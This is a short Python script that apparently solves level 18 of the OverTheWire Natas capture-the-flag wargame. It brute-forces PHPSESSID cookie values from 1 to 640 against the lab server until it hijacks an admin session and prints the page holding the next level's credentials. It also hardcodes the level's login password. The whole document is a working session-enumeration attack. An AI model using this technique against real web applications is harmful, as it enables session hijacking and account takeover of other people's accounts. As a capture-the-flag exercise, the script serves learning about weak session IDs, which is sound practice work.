import requests
from requests.auth import HTTPBasicAuth

URL = "http://natas18.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')
FAILURE_TEXT = "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."

for i in range(1, 641):
    cookie = { 'PHPSESSID' : f"{i}" }
    r = requests.post(URL, cookies=cookie, auth=auth)
    print(f"Trying session id: {i}")
    if FAILURE_TEXT not in r.text:
        print(f"Session ID found: {i}")
        print(r.text)
        break
    